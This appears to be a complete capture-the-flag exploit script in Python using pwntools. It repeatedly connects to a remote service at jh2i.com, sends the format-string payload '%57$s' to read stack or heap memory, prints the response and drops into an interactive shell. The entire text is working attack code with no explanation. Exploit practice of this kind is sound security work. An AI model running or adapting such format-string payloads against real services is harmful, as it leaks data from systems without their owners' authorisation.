from pwn import *
for i in range(1,100):
	s=remote("jh2i.com", 50038)
	s.send("%"+str(57)+"$s")
	print i
	print s.recv()
	s.interactive()
	s.close()

